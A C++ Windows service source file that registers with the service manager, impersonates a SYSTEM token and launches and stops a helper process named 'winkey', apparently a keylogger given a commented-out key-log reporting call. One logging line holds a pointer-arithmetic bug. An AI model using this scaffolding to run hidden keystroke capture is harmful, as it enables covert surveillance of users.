#include "tinky.hpp"
#include "utils.hpp"
#include "processes.h"

using namespace std;

extern tinky_t tinky;
extern processes_t processes;

static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
	tinky.svcStatus.dwCurrentState = currentState;
	tinky.svcStatus.dwControlsAccepted = ctrlsAccepted;
	
	SetServiceStatus(tinky.svcStatusHandle, &tinky.svcStatus);
}

static void stopAllProcesses(void) {
	SetEvent(tinky.tinkyStopEventHandle);
	SetEvent(processes.stopEventHandle);

	// terminateProcesses() TODO
	if (!TerminateProcess(processes.winkeyProcessInfo.hProcess, NONE)) {
		journalReport(wstring(L"Terminate process failed with code: ") + itostring(GetLastError()) + wstring(L"\n"));
	} // is it needed if the process stop by himself ?

	// closeProcesses() TODO
	if (processes.winkeyProcessInfo.hProcess)
		CloseHandle(processes.winkeyProcessInfo.hProcess);

	if (processes.winkeyProcessInfo.hThread)
		CloseHandle(processes.winkeyProcessInfo.hThread);

	if (processes.systemToken)
		CloseHandle(processes.systemToken);

	if (tinky.tinkyStopEventHandle)
		CloseHandle(tinky.tinkyStopEventHandle);
	sendStatus(SERVICE_STOPPED, NONE);
}

/* https://learn.microsoft.com/fr-fr/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex */
DWORD WINAPI controlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	switch(dwControl) {
		case (SERVICE_CONTROL_INTERROGATE):
			return (NO_ERROR);
		case (SERVICE_CONTROL_STOP):
			stopAllProcesses();
			return (NO_ERROR);
		case (SERVICE_CONTROL_SHUTDOWN):
			//reportKeyLogs();
			stopAllProcesses();
			return (NO_ERROR);
	}
	(void)dwEventType; // Event type, handle only if dwControl == SERVICE_CONTROL_SESSIONCHANGE
	(void)lpEventData; // Same as above
	(void)lpContext; // Same as RegisterServiceCtrlHandlerEx lpContext (void* user data)
	return (ERROR_CALL_NOT_IMPLEMENTED);
}

static void registerControlHandler(void) {
	tinky.svcStatusHandle = RegisterServiceCtrlHandlerExW(
				SVC_NAME,
				&controlHandler,
				NULL
			);
}

static HANDLE createEvent(const wchar_t *eventName) {
	return CreateEventW(
		NULL,
		FALSE,
		FALSE,
		eventName
	);
}

static BYTE initService(void) {
	impersonate();
	registerControlHandler();
	tinky.svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	sendStatus(SERVICE_START_PENDING, NONE);

	processes.stopEventHandle = createEvent(PROCESSES_STOP);
	tinky.tinkyStopEventHandle = createEvent(NO_NAME);
	return (SUCCESS);
}

/* WINAPI ServiceMain() */
VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
	if (!initService())
		return ;

	if (!launchProcesses(dwNumServicesArgs, lpServiceArgVectors)) {

		sendStatus(SERVICE_STOPPED, NONE);
		return ;

	} else {

		sendStatus(SERVICE_RUNNING, SERVICE_ACCEPT_STOP);

		while (true) {

			WaitForSingleObject(tinky.tinkyStopEventHandle, INFINITE);
			journalReport(wstring(L"Process tinky stop event\n").c_str());
			return ;

		}
	}
	(void)dwNumServicesArgs, (void)lpServiceArgVectors;
}

/* SERVICE_TABLE_ENTRY = array of services (name + funcptr) */
static void initTableEntry(SERVICE_TABLE_ENTRYW *svcTableEntry) {
	svcTableEntry[0].lpServiceName = SVC_NAME;
	svcTableEntry[0].lpServiceProc = &serviceMain;

	svcTableEntry[1].lpServiceName = NULL;
	svcTableEntry[1].lpServiceProc = NULL;
}

/* https://learn.microsoft.com/fr-fr/windows/win32/services/service-entry-point */
int startedBySCM(void) {
	journalReport(L"Entering start\n");
	SERVICE_TABLE_ENTRYW svcTableEntry[2] = {};

	initTableEntry(svcTableEntry);
	if (!StartServiceCtrlDispatcherW(svcTableEntry)) {

		DWORD lastErr = GetLastError();
		journalReport(wstring(L"Error while StartServiceCtrl" + lastErr + '\n').c_str());

		switch (lastErr) {
			case (ERROR_INVALID_DATA):
				cerr << "Invalid svcTableEntry data\n"; // These must be signal sending ?
				break ;
			case (ERROR_SERVICE_ALREADY_RUNNING):
				cerr << "Service is already running\n"; // These must be signal sending ?
				break ;
			default:
				printUsage();
				break ;
		}
		return (FAILURE);
	}
	return (SUCCESS);
}